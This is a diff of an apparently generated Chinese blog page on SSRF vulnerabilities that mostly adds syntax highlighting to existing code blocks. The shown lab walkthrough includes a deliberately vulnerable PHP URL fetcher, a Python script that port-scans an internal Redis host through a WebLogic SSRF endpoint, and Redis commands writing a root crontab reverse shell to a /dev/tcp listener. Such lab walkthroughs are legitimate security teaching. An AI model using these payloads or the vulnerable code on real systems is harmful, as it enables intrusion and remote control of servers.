@@ -459,6 +459,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -487,22 +490,23 @@
 <p>12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p>
 <h1 id="0x03-漏洞验证"><a href="#0x03-漏洞验证" class="headerlink" title="0x03 漏洞验证"></a>0x03 漏洞验证</h1><p>1、因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们可以通过抓包分析发送的请求是否是由服务器端发送的来判断是否存在SSRF漏洞</p>
 <p>2、在页面源码中查找访问的资源地址，如果该资源地址类型为下面这种样式则可能存在SSRF漏洞</p>
-<pre><code>http://www.xxx.com/a.php?image=(地址)</code></pre>
-<h1 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h1><h2 id="1、一个简单的测试靶场"><a href="#1、一个简单的测试靶场" class="headerlink" title="1、一个简单的测试靶场"></a>1、一个简单的测试靶场</h2><p>测试PHP代码：</p>
-<pre><code class="php">&lt;?php
-function curl($url)&#123;
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_HEADER, 0);
-    curl_exec($ch);
-    curl_close($ch);
-&#125;
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.xxx.com&#x2F;a.php?image&#x3D;(地址)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-$url = $_GET[&#39;url&#39;];
-curl($url);
-?&gt;</code></pre>
+<h1 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h1><h2 id="1、一个简单的测试靶场"><a href="#1、一个简单的测试靶场" class="headerlink" title="1、一个简单的测试靶场"></a>1、一个简单的测试靶场</h2><p>测试PHP代码：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">function</span> <span class="token function-definition function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+	<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>利用phpstudy或者宝塔搭建好靶场后，访问自己的url地址。</p>
-<pre><code>http://192.168.38.132/ssrf.php?url=teamssix.com</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.38.132&#x2F;ssrf.php?url&#x3D;teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>如果服务器有其他服务只能本地访问，比如phpmyadmin，则可以构造ssrf.php?url=127.0.0.1、phpmyadmin进行访问，接下来看看利用SSRF扫描目标主机端口</p>
 <p>打开Burp，抓包发到Intruder，设置Payload位置</p>
@@ -524,37 +528,37 @@ curl($url);
 <p>这时靶机返回信息提示连接不到服务，通过上面的两步测试可以判断出该目标是存在SSRF漏洞的。</p>
 <h3 id="2、通过Redis服务反弹shell"><a href="#2、通过Redis服务反弹shell" class="headerlink" title="2、通过Redis服务反弹shell"></a>2、通过Redis服务反弹shell</h3><p>既然想通过Redis服务反弹Shell，就需要先知道Redis服务的内网IP，这里因为是本地环境，内网IP就直接查看了，如果公网的话就要看前期信息收集怎么样了，当然爆破IP也是可以的。</p>
 <p>进入 redis服务 的shell，查看内网IP</p>
-<pre><code>:~/vulhub/weblogic/ssrf# docker exec -it ssrf_redis_1 bash
-[root@5d9f91f455b6 /]# ifconfig
+<pre class="line-numbers language-none"><code class="language-none">:~&#x2F;vulhub&#x2F;weblogic&#x2F;ssrf# docker exec -it ssrf_redis_1 bash
+[root@5d9f91f455b6 &#x2F;]# ifconfig
 eth0      Link encap:Ethernet  HWaddr 02:42:AC:12:00:02  
           inet addr:172.18.0.2  Bcast:172.18.255.255  Mask:255.255.0.0
           UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
           RX packets:129 errors:0 dropped:0 overruns:0 frame:0
           TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:0 
-          RX bytes:13176 (12.8 KiB)  TX bytes:0 (0.0 b)</code></pre>
+          RX bytes:13176 (12.8 KiB)  TX bytes:0 (0.0 b)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>知道内网IP后，就能扫描端口了，下面是我写的一个小脚本，当然用Burp也是可以的</p>
-<pre><code class="python">import requests
-url = &#39;http://192.168.38.134:7001/uddiexplorer/SearchPublicRegistries.jsp?&#39;
-headers = &#123;&#39;Content-Type&#39;:&#39;application/x-www-form-urlencoded&#39;&#125;
-for port in range(1,65535):
-    data = &#39;operator=http://172.18.0.2:&#123;&#125;&amp;rdoSearch=name&amp;txtSearchname=teamsix&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&#39;.format(port)
-    r = requests.post(url,headers=headers,data=data)
-    if &#39;Tried all&#39; not in r.text:
-        print(&#39;\n\n[+] &#123;&#125; 发现端口\n\n&#39;.format(port))</code></pre>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+url <span class="token operator">=</span> <span class="token string">'http://192.168.38.134:7001/uddiexplorer/SearchPublicRegistries.jsp?'</span>
+headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span><span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">&#125;</span>
+<span class="token keyword">for</span> port <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">65535</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	data <span class="token operator">=</span> <span class="token string">'operator=http://172.18.0.2:&#123;&#125;&amp;rdoSearch=name&amp;txtSearchname=teamsix&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span>
+	r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+	<span class="token keyword">if</span> <span class="token string">'Tried all'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n\n[+] &#123;&#125; 发现端口\n\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>执行脚本</p>
-<pre><code>~# python3 ssrf_portscan.py
-[+] 6379 发现端口</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">~# python3 ssrf_portscan.py
+[+] 6379 发现端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>通过扫描发现Redis服务的默认端口6373是开放的。</p>
 <p>接下来使用Burp写入shell，注意下面的IP地址为自己nc监听的地址</p>
-<pre><code>http://172.18.0.2:6379/test
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;172.18.0.2:6379&#x2F;test
 
-set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.10.30/4444 0&gt;&amp;1\n\n\n\n&quot;
-config set dir /etc/
+set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.10.30&#x2F;4444 0&gt;&amp;1\n\n\n\n&quot;
+config set dir &#x2F;etc&#x2F;
 config set dbfilename crontab
 save
 
-aaa</code></pre>
+aaa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF10.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>如果使用 Burp 的话，直接把那几行代码复制到 operator 参数后面就行，就不用URL编码了。</p>
 <p>如果反弹不回 Shell ，在确定各个 IP、端口等参数都没有问题的情况下，Burp 里多点几次几次发送就可以了，我有时候都需要点个几十次才能反弹 Shell ，感觉有些情况下反弹 Shell 是个比较玄学的东西。</p>
@@ -1006,7 +1010,7 @@ EngineEngine 负责控制系统所有组件之间的数据流，并在某些操�
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">162.6k</span>&nbsp;字
+                class="white-color">164k</span>&nbsp;字
             
             
             
